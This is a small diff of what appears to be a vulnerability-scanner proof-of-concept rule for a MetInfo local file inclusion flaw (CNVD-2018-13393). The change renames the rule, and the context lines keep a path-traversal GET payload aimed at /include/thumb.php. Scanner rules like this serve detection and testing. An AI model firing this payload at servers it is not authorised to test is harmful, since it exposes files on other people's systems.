@@ -1,4 +1,4 @@
-name: poc-yaml-metinfo-lfi
+name: poc-yaml-metinfo-lfi-cnvd-2018-13393
 rules:
   - method: GET
     path: /include/thumb.php?dir=http\..\index.php
